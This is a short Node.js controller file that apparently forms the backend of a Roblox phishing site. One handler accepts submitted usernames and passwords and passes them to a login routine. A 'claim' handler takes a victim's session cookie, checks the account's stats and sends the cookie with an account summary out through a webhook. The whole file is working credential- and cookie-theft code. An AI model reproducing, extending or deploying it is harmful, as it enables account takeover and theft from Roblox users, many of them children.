const login = require("../login");
const getRobloxStats = require("../cookiechecker");
const roblox = require("../services/roblox.service");
const webhook = require("../services/webhook.service");

async function loginController(req, res) {
    try {
        const { username, password } = req.body;

        if (!username || !password) {
            return res.status(400).json({ error: "Missing fields" });
        }

        const result = await login(username, password);

        return res.json(result);

    } catch (err) {
        console.error(err);
        return res.status(500).json({ error: "Login error" });
    }
}

async function claimController(req, res) {
    try {
        const { username, cookie } = req.body;

        if (!username || !cookie) {
            return res.status(400).json({ error: "Missing fields" });
        }

        const userId = await roblox.getUserId(username);
        const avatar = await roblox.getAvatar(userId);
        const stats = await getRobloxStats(cookie);

        const embed = roblox.buildEmbed({ username, userId, stats, avatar });

        await webhook.send(cookie, embed);

        res.json({ success: true });

    } catch (err) {
        console.error(err);
        res.status(500).json({ error: "Claim error" });
    }
}

module.exports = { loginController, claimController };